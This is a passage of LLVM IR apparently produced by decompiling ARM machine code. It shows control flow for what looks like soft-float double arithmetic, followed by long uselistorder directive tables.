  %v1_1824452 = phi i32 [ %v1_1824453, %.thread8 ], [ %v6_18260, %bb100 ]
  %v2_18264 = or i32 %v0_1826c, %v1_18270
  %v4_18264 = icmp eq i32 %v2_18264, 0
  br i1 %v4_18264, label %dec_label_pc_182a4, label %dec_label_pc_1826c

dec_label_pc_1826c:                               ; preds = %.thread10
  %v3_1826c = mul i32 %v0_1826c, 16
  %v4_18270 = udiv i32 %v1_18270, 268435456
  %v5_18270 = or i32 %v3_1826c, %v4_18270
  store i32 %v5_18270, i32* %r5.global-to-local, align 4
  %v3_18274 = mul i32 %v1_18270, 16
  store i32 %v3_18274, i32* %r6.global-to-local, align 4
  %v3_18278 = mul nuw i32 %v3_18248, 8
  %v4_1827c = udiv i32 %v15_1824c, 536870912
  %v5_1827c = or i32 %v4_1827c, %v3_18278
  %v3_18280 = mul i32 %v15_1824c, 8
  %v3_18284 = udiv i32 %v0_18284, 16
  store i32 %v3_18284, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_18284, 16
  br i1 %tmp, label %dec_label_pc_1828c, label %dec_label_pc_181fc

dec_label_pc_1828c:                               ; preds = %dec_label_pc_1826c
  %v1_1828c = and i32 %v1_182a8.ph, 1048576
  %v2_1828c = icmp eq i32 %v1_1828c, 0
  br i1 %v2_1828c, label %dec_label_pc_18294, label %.thread11.loopexit

dec_label_pc_18294:                               ; preds = %dec_label_pc_1828c
  %v2_18294 = or i32 %v2_182a8, %v1_182a8.ph
  store i32 %v2_18294, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_181fc.outer

dec_label_pc_182a4:                               ; preds = %.thread10
  store i32 %v15_1824c, i32* %r2.global-to-local, align 4
  store i32 %v3_18248, i32* %r3.global-to-local, align 4
  %v1_182a4 = and i32 %v1_182a8.ph, 1048576
  %v2_182a4 = icmp eq i32 %v1_182a4, 0
  br i1 %v2_182a4, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_182a4
  %v3_182a8 = or i32 %v2_182a8, %v1_182a8.ph
  store i32 %v3_182a8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_1828c
  store i32 %v3_18280, i32* %r2.global-to-local, align 4
  store i32 %v5_1827c, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_182a4, %bb101
  %v1_182b0 = add nsw i32 %v4_181d0, 515
  store i32 %v1_182b0, i32* %ip.global-to-local, align 4
  %v2_182b0 = icmp ugt i32 %v1_181d4, 252
  %v7_182b0 = icmp eq i32 %v1_181d4, 253
  %v2_182b4 = xor i1 %v7_182b0, true
  %v3_182b4 = and i1 %v2_182b0, %v2_182b4
  br i1 %v3_182b4, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_182b4 = icmp ugt i32 %v1_182b0, 1791
  %v11_182b4 = icmp eq i32 %v1_182b0, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_182b8 = phi i1 [ %v7_182b0, %.thread11 ], [ %v11_182b4, %bb102 ]
  %v0_182b8 = phi i1 [ %v2_182b0, %.thread11 ], [ %v6_182b4, %bb102 ]
  %v2_182b8 = xor i1 %v1_182b8, true
  %v3_182b8 = and i1 %v0_182b8, %v2_182b8
  call void @__pseudo_cond_branch(i1 %v3_182b8, i32 ptrtoint (i32* @global_var_17fcc.716 to i32))
  %v0_182bc = load i32, i32* %r5.global-to-local, align 4
  %v1_182bc = load i32, i32* %r3.global-to-local, align 4
  %v2_182bc = sub i32 %v0_182bc, %v1_182bc
  store i32 %v2_182bc, i32* @ip, align 4
  %v3_182bc = icmp uge i32 %v0_182bc, %v1_182bc
  %v9_182bc = icmp eq i32 %v0_182bc, %v1_182bc
  br i1 %v9_182bc, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_182c0 = load i32, i32* %r6.global-to-local, align 4
  %v2_182c0 = load i32, i32* %r2.global-to-local, align 4
  %v3_182c0 = sub i32 %v1_182c0, %v2_182c0
  store i32 %v3_182c0, i32* @ip, align 4
  %v4_182c0 = icmp uge i32 %v1_182c0, %v2_182c0
  %v10_182c0 = icmp eq i32 %v1_182c0, %v2_182c0
  br i1 %v10_182c0, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_182c4 = load i32, i32* %r0.global-to-local, align 4
  %v2_182c4 = urem i32 %v1_182c4, 2
  %v3_182c4 = icmp ne i32 %v2_182c4, 0
  %v4_182c4 = udiv i32 %v1_182c4, 2
  store i32 %v4_182c4, i32* @ip, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_182c8 = phi i1 [ %v3_182bc, %bb103 ], [ %v4_182c0, %bb104 ], [ %v3_182c4, %bb105 ]
  %v0_182c8 = load i32, i32* %r0.global-to-local, align 4
  %v2_182c8 = zext i1 %v1_182c8 to i32
  %v3_182c8 = add i32 %v2_182c8, %v0_182c8
  store i32 %v3_182c8, i32* %r0.global-to-local, align 4
  %v0_182cc = load i32, i32* %r1.global-to-local, align 4
  %v1_182cc = load i32, i32* %r4.global-to-local, align 4
  %v2_182cc = and i32 %v1_182cc, 4096
  %v3_182cc = icmp ne i32 %v2_182cc, 0
  %v4_182cc = mul i32 %v1_182cc, 1048576
  %v6_182cc = add i32 %v4_182cc, %v0_182cc
  %v7_182cc = zext i1 %v3_182cc to i32
  %v8_182cc = add i32 %v7_182cc, %v6_182cc
  store i32 %v8_182cc, i32* @r1, align 4
  %v2_182d0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_182d0, i32* @r4, align 4
  store i32 %v6_18170, i32* @r5, align 4
  store i32 %v9_18170, i32* @r6, align 4
  store i32 %v12_18170, i32* @lr, align 4
  ret i32 %v3_182c8

dec_label_pc_182d8:                               ; preds = %dec_label_pc_18190
  %v1_182d8 = and i32 %v2_18194, -2147483648
  %v4_182dc = urem i32 %v1_1817c, 1048576
  %v5_182dc = or i32 %v1_182d8, %v4_182dc
  store i32 %v5_182dc, i32* %r1.global-to-local, align 4
  %v6_182e0 = add nsw i32 %v2_18190, 1023
  store i32 %v6_182e0, i32* %r4.global-to-local, align 4
  %v8_182e0 = sub nsw i32 0, %v2_18190
  %v9_182e0 = and i32 %v6_182e0, %v8_182e0
  %v11_182e0 = icmp slt i32 %v2_18190, -1023
  %v12_182e0 = icmp eq i32 %v6_182e0, 0
  %v7_182e4 = icmp sgt i32 %v2_18190, -1023
  br i1 %v7_182e4, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_182d8
  %v10_182e4 = sub nsw i32 1024, %v2_18190
  store i32 %v10_182e4, i32* %r5.global-to-local, align 4
  %v14_182e4 = and i32 %v10_182e4, %v6_182e0
  %v16_182e4 = icmp slt i32 %v10_182e4, 0
  %v17_182e4 = icmp eq i32 %v6_182e0, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_182d8, %bb106
  %v3_182f0.in = phi i32 [ %v9_182e0, %dec_label_pc_182d8 ], [ %v14_182e4, %bb106 ]
  %v2_182f0 = phi i1 [ %v11_182e0, %dec_label_pc_182d8 ], [ %v16_182e4, %bb106 ]
  %v1_182f0 = phi i1 [ %v12_182e0, %dec_label_pc_182d8 ], [ %v17_182e4, %bb106 ]
  %v3_182f0 = icmp slt i32 %v3_182f0.in, 0
  %v3_182e8 = xor i1 %v3_182f0, %v2_182f0
  %v4_182e8 = or i1 %v1_182f0, %v3_182e8
  br i1 %v4_182e8, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_182e884 = mul i32 %v6_182e0, 1048576
  %v10_182e885 = or i32 %v9_182e884, %v5_182dc
  store i32 %v10_182e885, i32* %r1.global-to-local, align 4
  store i32 %v3_18170, i32* %r4.global-to-local, align 4
  store i32 %v6_18170, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_182f0 = phi i32 [ %v12_18170, %bb108 ], [ %v1_182d8, %bb107 ]
  %v6_182f0 = xor i1 %v4_182e8, true
  call void @__pseudo_cond_branch(i1 %v6_182f0, i32 %v0_182f0)
  %v0_182f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_182f4 = or i32 %v0_182f4, 1048576
  store i32 %v1_182f4, i32* @r1, align 4
  %v0_182fc = load i32, i32* %r4.global-to-local, align 4
  %v1_182fc = add i32 %v0_182fc, -1
  store i32 %v1_182fc, i32* @r4, align 4
  %v3_182fc = sub i32 0, %v0_182fc
  %v4_182fc = and i32 %v0_182fc, %v3_182fc
  %v5_182fc = icmp slt i32 %v4_182fc, 0
  store i1 %v5_182fc, i1* @cpsr_v, align 1
  %v6_182fc = icmp slt i32 %v1_182fc, 0
  store i1 %v6_182fc, i1* @cpsr_n, align 1
  %v7_182fc = icmp eq i32 %v0_182fc, 1
  store i1 %v7_182fc, i1* @cpsr_z, align 1
  %v0_18300 = call i32 @function_17fcc()
  store i32 %v0_18300, i32* @r0, align 4
  %v0_18308 = call i32 @function_17fcc()
  store i32 %v0_18308, i32* @r0, align 4
  %v0_1830c.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_18310.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1830c

dec_label_pc_1830c:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_1830c.pre-phi = phi i32 [ %v5_18180, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_18180, %bb91 ], [ %v5_18180, %.thread ]
  %v0_18310 = phi i32 [ %v5_1817c, %.thread1 ], [ %v5_1817c, %.thread2 ], [ %v5_1817c, %bb91 ], [ %v0_18310.pre, %.thread ]
  %v2_18314 = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_1830c.pre, %.thread ]
  %v5_1830c = and i32 %v2_18314, %v4_1830c.pre-phi
  store i32 %v5_1830c, i32* @r5, align 4
  %v4_18310 = icmp eq i32 %v2_18314, %v0_18310
  br i1 %v4_18310, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_1830c
  %v5_18314 = icmp eq i32 %v5_1830c, %v2_18314
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_1830c, %bb109
  %v0_18318 = phi i1 [ false, %dec_label_pc_1830c ], [ %v5_18314, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_18318, i32 ptrtoint (i32* @global_var_18160.718 to i32))
  %v0_1831c = load i32, i32* @r4, align 4
  %v1_1831c = load i32, i32* %ip.global-to-local, align 4
  %v4_1831c = icmp eq i32 %v1_1831c, %v0_1831c
  br i1 %v4_1831c, label %dec_label_pc_18324, label %dec_label_pc_18340

dec_label_pc_18324:                               ; preds = %bb110
  %v0_18324 = load i32, i32* @r0, align 4
  %v1_18324 = load i32, i32* @r1, align 4
  %v4_18324 = mul i32 %v1_18324, 4096
  %v5_18324 = or i32 %v4_18324, %v0_18324
  store i32 %v5_18324, i32* %r4.global-to-local, align 4
  %v1_18328 = icmp ne i32 %v5_18324, 0
  call void @__pseudo_cond_branch(i1 %v1_18328, i32 ptrtoint (i32* @global_var_18160.718 to i32))
  %v0_1832c = load i32, i32* @r5, align 4
  %v1_1832c = load i32, i32* %ip.global-to-local, align 4
  %v1_18330 = icmp ne i32 %v1_1832c, %v0_1832c
  call void @__pseudo_cond_branch(i1 %v1_18330, i32 ptrtoint (i32* @global_var_18144.719 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1833c = call i32 @function_18160(i32 %arg3, i32 %arg4)
  store i32 %v2_1833c, i32* @r0, align 4
  %v1_18340.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18340

dec_label_pc_18340:                               ; preds = %bb110, %dec_label_pc_18324
  %v1_18340 = phi i32 [ %v1_1831c, %bb110 ], [ %v1_18340.pre, %dec_label_pc_18324 ]
  %v0_18340 = load i32, i32* @r5, align 4
  %v4_18340 = icmp eq i32 %v0_18340, %v1_18340
  br i1 %v4_18340, label %dec_label_pc_18348, label %dec_label_pc_18340.dec_label_pc_1835c_crit_edge

dec_label_pc_18340.dec_label_pc_1835c_crit_edge:  ; preds = %dec_label_pc_18340
  %v0_1835c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1835c

dec_label_pc_18348:                               ; preds = %dec_label_pc_18340
  %v4_18348 = mul i32 %arg4, 4096
  %v5_18348 = or i32 %v4_18348, %arg3
  store i32 %v5_18348, i32* %r5.global-to-local, align 4
  %v7_18348 = icmp eq i32 %v5_18348, 0
  call void @__pseudo_cond_branch(i1 %v7_18348, i32 ptrtoint (i32* @global_var_180f4.720 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_18358 = call i32 @function_18160(i32 %arg3, i32 %arg4)
  store i32 %v2_18358, i32* @r0, align 4
  br label %dec_label_pc_1835c

dec_label_pc_1835c:                               ; preds = %dec_label_pc_18340.dec_label_pc_1835c_crit_edge, %dec_label_pc_18348
  %v0_1835c = phi i32 [ %v0_1835c.pre, %dec_label_pc_18340.dec_label_pc_1835c_crit_edge ], [ %v2_18358, %dec_label_pc_18348 ]
  %v1_1835c = load i32, i32* @r1, align 4
  %v3_1835c = mul i32 %v1_1835c, 2
  %v4_1835c = or i32 %v3_1835c, %v0_1835c
  store i32 %v4_1835c, i32* %r6.global-to-local, align 4
  %v6_1835c = icmp eq i32 %v4_1835c, 0
  br i1 %v6_1835c, label %dec_label_pc_1835c._crit_edge, label %bb111

dec_label_pc_1835c._crit_edge:                    ; preds = %dec_label_pc_1835c
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_1835c
  %v4_18360 = mul i32 %arg4, 2
  %v5_18360 = or i32 %v4_18360, %arg3
  store i32 %v5_18360, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_18360, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_1835c._crit_edge, %bb111
  %v4_18370.pre-phi = phi i32 [ %.pre80, %dec_label_pc_1835c._crit_edge ], [ %v5_18360, %bb111 ]
  %v0_18364 = phi i1 [ false, %dec_label_pc_1835c._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_18364, i32 ptrtoint (i32* @global_var_1808c.721 to i32))
  %v0_18368 = load i32, i32* @r0, align 4
  %v1_18368 = load i32, i32* @r1, align 4
  %v3_18368 = mul i32 %v1_18368, 2
  %v4_18368 = or i32 %v3_18368, %v0_18368
  store i32 %v4_18368, i32* %r4.global-to-local, align 4
  %v1_1836c = icmp ne i32 %v4_18368, 0
  call void @__pseudo_cond_branch(i1 %v1_1836c, i32 ptrtoint (i32* @global_var_18144.719 to i32))
  store i32 %v4_18370.pre-phi, i32* %r5.global-to-local, align 4
  %v1_18374 = icmp ne i32 %v4_18370.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_18374, i32 ptrtoint (i32* @global_var_180f4.720 to i32))
  %v0_18378 = load i32, i32* @r0, align 4
  %v1_18378 = load i32, i32* @r1, align 4
  %v2_18378 = call i32 @function_18160(i32 %v0_18378, i32 %v1_18378)
  store i32 %v2_18378, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v1_18380 = call i32 @function_18390(i32 %v2_18378)
  store i32 %v1_18380, i32* %r0.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v1_18388 = call i32 @function_18390(i32 %v1_18380)
  store i32 %v1_18388, i32* %r0.global-to-local, align 4
  ret i32 %v1_18388

; uselistorder directives
  uselistorder i32 %v5_18360, { 1, 0, 2 }
  uselistorder i32 %v1_1831c, { 1, 0 }
  uselistorder i32 %v1_182fc, { 1, 0 }
  uselistorder i32 %v0_182fc, { 3, 1, 0, 2 }
  uselistorder i32 %v10_182e4, { 2, 0, 1 }
  uselistorder i32 %v6_182e0, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_182d8, { 1, 0 }
  uselistorder i32 %v2_182c0, { 1, 0, 2 }
  uselistorder i32 %v1_182c0, { 1, 0, 2 }
  uselistorder i32 %v1_182bc, { 1, 0, 2 }
  uselistorder i32 %v0_182bc, { 1, 0, 2 }
  uselistorder i1 %v7_182b0, { 1, 0 }
  uselistorder i32 %v2_18294, { 1, 0 }
  uselistorder i32 %v3_18280, { 2, 1, 0 }
  uselistorder i32 %v3_18274, { 0, 2, 1 }
  uselistorder i32 %v5_18270, { 2, 0, 1 }
  uselistorder i32 %v6_18260, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1824c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_18248, { 3, 0, 2, 1 }
  uselistorder i32 %v0_18254, { 0, 2, 1 }
  uselistorder i32 %v1_18260, { 1, 0 }
  uselistorder i32 %v6_18244, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_18230, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1822c, { 0, 2, 1 }
  uselistorder i32 %v0_18238, { 0, 2, 1 }
  uselistorder i32 %v1_18244, { 1, 0 }
  uselistorder i32 %v6_18228, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_18214, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1821c, { 0, 2, 1 }
  uselistorder i32 %v1_18228, { 1, 0 }
  uselistorder i32 %v3_1820c, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_18200, { 1, 2, 0 }
  uselistorder i32 %v3_1828013, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_1827c17, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_18200, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1820c, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_182a8.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_181ec, { 1, 0 }
  uselistorder i32 %v0_181f0, { 1, 0 }
  uselistorder i32 %v3_181dc, { 1, 0 }
  uselistorder i1 %v1_181d0, { 1, 0 }
  uselistorder i32 %v3_181c0, { 2, 3, 1, 0 }
  uselistorder i32 %v5_181bc, { 3, 2, 1, 0 }
  uselistorder i32 %v3_181b4, { 2, 1, 0 }
  uselistorder i32 %v5_181b0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_18190, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_18180, { 2, 3, 1, 0 }
  uselistorder i32 %v5_18180, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_1817c, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_1817c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_18170, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 12, 13 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 3, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 8, 9, 2, 5, 3, 4, 6, 7 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 0, 3, 9, 10, 4, 5, 6, 7, 8, 11 }
  uselistorder i32* %ip.global-to-local, { 4, 5, 6, 3, 1, 2, 0, 7 }
  uselistorder i32 (i32)* @function_18390, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_18160, { 2, 1, 0 }
  uselistorder i32 ()* @function_17fcc, { 1, 0 }
  uselistorder i1* @cpsr_n, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32 1024, { 5, 0, 14, 15, 6, 16, 4, 17, 18, 19, 1, 2, 7, 11, 12, 13, 8, 3, 10, 20, 9 }
  uselistorder i32 1791, { 1, 0 }
  uselistorder i32 536870912, { 2, 3, 4, 0, 1 }
  uselistorder i32 16, { 1, 9, 7, 8, 10, 31, 102, 103, 110, 112, 11, 113, 12, 115, 116, 48, 117, 119, 124, 125, 126, 33, 32, 49, 127, 13, 128, 129, 164, 165, 144, 145, 50, 87, 88, 89, 90, 114, 120, 121, 122, 123, 51, 111, 2, 52, 130, 131, 132, 133, 39, 40, 41, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 166, 167, 168, 104, 53, 105, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 169, 42, 156, 106, 107, 54, 55, 108, 109, 91, 92, 56, 93, 57, 58, 59, 34, 118, 43, 94, 180, 60, 61, 62, 63, 64, 65, 66, 170, 171, 0, 172, 173, 67, 35, 14, 15, 100, 101, 29, 174, 30, 134, 135, 136, 137, 138, 175, 176, 4, 3, 36, 68, 69, 70, 139, 140, 71, 72, 141, 73, 74, 157, 158, 159, 160, 161, 162, 86, 177, 178, 75, 76, 179, 16, 77, 78, 79, 80, 81, 17, 27, 18, 19, 5, 20, 21, 22, 28, 23, 6, 24, 25, 26, 82, 95, 96, 44, 97, 45, 46, 47, 98, 99, 37, 142, 83, 143, 38, 84, 85, 163 }
  uselistorder i32 8, { 1, 2, 3, 4, 5, 6, 68, 92, 93, 100, 102, 103, 104, 105, 7, 106, 107, 108, 109, 110, 111, 35, 71, 51, 52, 69, 160, 161, 162, 163, 31, 126, 72, 73, 74, 75, 112, 113, 114, 115, 116, 117, 118, 119, 101, 120, 121, 122, 227, 43, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 164, 127, 128, 129, 130, 131, 132, 133, 134, 135, 8, 44, 136, 42, 137, 138, 70, 139, 140, 165, 166, 167, 94, 95, 96, 97, 98, 99, 76, 77, 78, 79, 53, 245, 246, 55, 36, 80, 9, 85, 226, 81, 33, 168, 169, 170, 171, 172, 173, 174, 175, 10, 56, 176, 177, 178, 179, 180, 181, 182, 183, 11, 184, 185, 186, 187, 12, 188, 189, 13, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 207, 200, 201, 202, 203, 57, 26, 204, 205, 206, 58, 59, 14, 208, 209, 210, 211, 213, 214, 60, 15, 215, 16, 212, 90, 91, 39, 216, 47, 48, 45, 46, 27, 28, 40, 41, 49, 247, 123, 217, 218, 219, 141, 142, 65, 143, 144, 145, 146, 32, 147, 61, 62, 148, 149, 150, 50, 151, 152, 153, 154, 29, 30, 155, 156, 157, 63, 220, 221, 222, 34, 223, 224, 225, 82, 83, 54, 67, 37, 17, 18, 24, 19, 66, 38, 20, 21, 25, 22, 64, 23, 84, 86, 87, 88, 89, 124, 125, 158, 159, 0 }
  uselistorder i32 4, {}
  uselistorder i32 32, { 76, 77, 78, 79, 16, 17, 24, 61, 62, 19, 20, 80, 18, 25, 81, 82, 83, 84, 23, 85, 64, 66, 67, 73, 30, 63, 74, 68, 31, 71, 72, 32, 65, 75, 26, 21, 86, 33, 12, 87, 88, 34, 69, 70, 29, 28, 27, 35, 39, 36, 40, 37, 41, 38, 42, 50, 51, 49, 52, 53, 54, 55, 56, 57, 44, 45, 1, 46, 2, 47, 4, 3, 43, 48, 58, 99, 22, 100, 101, 102, 89, 90, 11, 91, 0, 59, 92, 93, 94, 95, 96, 97, 13, 103, 6, 5, 8, 7, 14, 15, 10, 9, 98, 60 }
  uselistorder i32 33, { 3, 4, 5, 1, 6, 7, 2, 0 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 90, 12, 13, 14, 89, 97, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 99, 57, 100, 58, 101, 59, 102, 103, 60, 61, 63, 62, 64, 86, 65, 66, 67, 0, 93, 1, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 98, 78, 79, 80, 88, 104, 81, 82, 83, 87, 94, 95, 105, 84, 85, 91, 92, 96 }
  uselistorder i32 1048576, { 17, 0, 1, 2, 18, 19, 11, 3, 4, 5, 20, 6, 7, 21, 22, 13, 14, 8, 9, 23, 24, 25, 15, 26, 10, 16, 12, 27 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 168, 169, 170, 171, 172, 173, 174, 175, 176, 63, 64, 3, 65, 66, 67, 68, 84, 85, 86, 87, 92, 93, 94, 95, 96, 97, 98, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 130, 131, 132, 133, 134, 138, 139, 5, 4, 23, 24, 25, 26, 27, 28, 140, 141, 6, 142, 143, 144, 145, 146, 147, 148, 99, 100, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 88, 89, 90, 91, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 69, 7, 70, 71, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 0, 190, 191, 192, 193, 194, 195, 196, 197, 198, 8, 199, 200, 201, 202, 203, 204, 205, 72, 73, 74, 75, 9, 10, 76, 77, 78, 79, 80, 81, 82, 83, 29, 30, 31, 32, 33, 34, 35, 11, 12, 13, 295, 296, 297, 298, 299, 300, 301, 36, 14, 37, 15, 38, 293, 294, 39, 40, 41, 59, 60, 61, 62, 42, 43, 44, 45, 46, 47, 241, 245, 246, 247, 248, 242, 243, 244, 249, 250, 251, 252, 253, 16, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 269, 271, 265, 266, 267, 268, 270, 272, 135, 136, 137, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 17, 273, 274, 163, 164, 165, 166, 167, 275, 18, 276, 277, 218, 19, 22, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 2, 234, 20, 48, 219, 1, 220, 221, 49, 50, 278, 279, 21, 280, 281, 282, 283, 51, 52, 53, 54, 55, 56, 57, 58, 235, 236, 237, 238, 284, 285, 286, 287, 288, 289, 290, 291, 292, 239, 240 }
  uselistorder i32* @r5, { 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 32, 33, 34, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 137, 143, 144, 145, 146, 149, 150, 151, 152, 153, 154, 155, 156, 0, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 7, 176, 25, 177, 178, 179, 180, 181, 24, 182, 183, 184, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 8, 218, 217, 26, 219, 220, 221, 222, 223, 35, 36, 37, 38, 39, 224, 225, 226, 227, 228, 229, 234, 235, 230, 231, 232, 233, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 9, 302, 303, 41, 42, 43, 44, 45, 46, 47, 48, 49, 147, 148, 185, 186, 187, 10, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 138, 139, 140, 11, 141, 142, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 372, 373, 374, 375, 445, 446, 447, 115, 29, 116, 4, 117, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 376, 377, 27, 378, 118, 119, 120, 121, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 1, 321, 322, 323, 324, 325, 326, 122, 14, 123, 124, 12, 125, 126, 127, 128, 129, 130, 13, 131, 132, 133, 134, 135, 136, 50, 15, 51, 52, 53, 54, 30, 40, 16, 55, 56, 57, 58, 59, 460, 17, 461, 462, 470, 471, 60, 61, 62, 63, 64, 65, 66, 463, 464, 465, 466, 67, 68, 69, 70, 71, 72, 73, 74, 75, 100, 101, 102, 76, 77, 78, 79, 80, 467, 468, 469, 81, 82, 83, 84, 379, 380, 384, 385, 386, 387, 388, 381, 382, 383, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 6, 402, 403, 404, 405, 406, 18, 407, 408, 409, 410, 248, 249, 250, 251, 411, 19, 412, 413, 414, 327, 20, 328, 31, 329, 330, 331, 332, 333, 334, 252, 253, 254, 255, 256, 257, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 258, 259, 2, 260, 261, 262, 425, 426, 427, 428, 429, 335, 336, 338, 337, 339, 340, 21, 341, 342, 343, 344, 345, 346, 347, 28, 348, 349, 353, 5, 354, 3, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 85, 86, 87, 350, 351, 352, 88, 89, 430, 431, 432, 433, 434, 435, 22, 436, 437, 91, 92, 93, 94, 95, 96, 97, 98, 99, 365, 366, 367, 368, 369, 370, 438, 439, 440, 441, 442, 23, 443, 444, 90, 103, 371 }
  uselistorder i32 %arg4, { 0, 1, 11, 10, 2, 9, 8, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 9, 8, 4, 7, 6, 0, 1, 5, 10 }
